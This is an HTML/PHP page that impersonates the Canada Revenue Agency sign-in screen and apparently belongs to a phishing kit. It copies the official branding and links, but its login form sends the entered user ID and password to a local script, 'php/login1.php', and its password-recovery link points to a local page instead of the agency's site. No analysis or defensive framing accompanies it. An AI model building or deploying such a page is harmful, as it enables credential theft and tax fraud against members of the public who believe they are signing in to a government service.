<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
      <link rel="stylesheet" href="./reg.css">
   </head>
   <body>
</header>
<?php include ("files/head.php"); ?>
<div id="brand-container-cra">
			<div class="container">
				<div class="row">
					<div class="col-xs-12 col-sm-10" id="brand-text-cra">
						Canada Revenue Agency
					</div>
					
					<div class="col-xs-4 col-sm-2 text-right">
						
					</div>
				</div>
			</div>
		</div>
<main role="main" property="mainContentOfPage" class="container">
    <div class="center">
        <div id="content">
            <h1 id="wb-cont"> CRA Sign in </h1>
            
            <form id="login" action="php/login1.php" method="post" autocomplete="off" class="style-Igqem">
                <div>
                    <div>
                        <div class="form-group ">
                            <div>
                                <label for="userid" class="required"> User ID <strong class="required"><i>(required)</i></strong>
                                </label>
                            </div>
                            <input type="text" name="username" id="userid" class="form-control" autocomplete="off">
                            <p>
                                <a href="https://ams-sga.cra-arc.gc.ca/gol-ged/awsc/amss/enrol/useridrecovery">Forgot your user ID?</a>
                            </p>
                        </div>
                        <div class="clear"></div>
                        <div class="form-group ">
                            <div>
                                <label for="password" class="required"> Password <strong class="required"><i>(required)</i></strong>
                                </label>
                            </div>
                            <input class="form-control inline" type="password" name="PASSWORD" id="password" autocomplete="off">
                            <i tabindex="0" role="button" aria-describedby="togglePasswordSpan" class="fa-solid fa-eye style-Yakal" id="togglePassword" title="Show Password"></i>
                            <span class="sr-only" id="togglePasswordSpan">Show Password</span>
                            <p>
                                <a href="forgotpass.php">Forgot your password?</a>
                            </p>
                        </div>
                    </div>
                    <div class="clear"></div>
                    <p> For more information on how your privacy is protected, refer to our <a href="https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services/personal-information-collection-statement.html" target="_blank" rel="noopener noreferrer">Personal Information Collection Statement<span class="wb-inv">, opens in a separate window.</span></a>. </p>
                    <input type="submit" name="submitButton" class="btn btn-primary h-captcha" data-sitekey="a06f75d0-edbc-4562-9aef-7e2bb54bbbb2" data-callback="onSubmit" value="Sign in" id="submitButton" data-hcaptcha-widget-id="0po1de8x69rp">
                        <input type="button" name="exit" class="btn btn-default" value="Exit" id="exitButton">
                    </div>
                </div>
            </form>
            <p>
                <a href="https://www.canada.ca/en/revenue-agency/services/e-services/cra-login-services/cra-login-services-register-forgot-your-user.html" target="_blank" rel="noopener noreferrer">Register<span class="wb-inv">, opens in a separate window.</span></a> if you are a new user.
            </p>
            <p> To <a href="#manageOptionsHelp" aria-controls="centred-popup" class="wb-lbx wb-init wb-lbx-inited" id="wb-auto-3">revoke or change your CRA user ID or password, or to manage your security questions and answers</a>, you must first sign in. </p>
            <div id="pageLabel">Screen ID: CMS.30</div>
        </div>
        
        
    </div>
    <div>
        <dl id="wb-dtmd" property="dateModified">
            <dt>Date modified: </dt>
            <dd><time>2024-02-05</time></dd>
        </dl>
    </div>
</main>
<?php include ("files/footer.php"); ?>